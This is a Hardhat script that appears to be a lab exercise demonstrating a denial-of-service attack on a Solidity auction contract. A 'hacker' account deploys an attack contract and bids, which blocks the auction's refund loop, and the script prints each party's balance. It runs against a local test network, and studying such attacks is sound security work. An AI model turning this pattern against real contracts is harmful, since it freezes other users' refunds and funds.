import hre, { ethers } from 'hardhat';

async function main() {
  const [user1, user2, hacker] = await ethers.getSigners();

  const DosAuction = await ethers.getContractFactory('DosAuction', user1);
  const auction = await DosAuction.deploy();
  await auction.waitForDeployment();

  const DosAttack = await ethers.getContractFactory('DosAttack', hacker);
  const attack = await DosAttack.deploy(auction.target);
  await attack.waitForDeployment();

  const txBid = await auction
    .connect(user1)
    .bid({ value: ethers.parseEther('5.0') });
  await txBid.wait();

  const txAttackBid = await attack.connect(hacker).doBid({ value: 50 });
  await txAttackBid.wait();

  const txUserBid = await auction.connect(user2).bid({
    value: ethers.parseEther('6.0'),
  });
  await txUserBid.wait();

  console.log(
    'Auction balance',
    await ethers.provider.getBalance(auction.target)
  );

  try {
    const txRefund = await auction.refund();
    await txRefund.wait();
  } catch (e) {
    console.error(e);
  } finally {
    console.log('Refund progress', await auction.refundProgress());

    console.log(
      'User 1 balance',
      await ethers.provider.getBalance(user1.address)
    );
    console.log(
      'Hacker balance',
      await ethers.provider.getBalance(hacker.address)
    );
    console.log(
      'User 2 balance',
      await ethers.provider.getBalance(user2.address)
    );
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
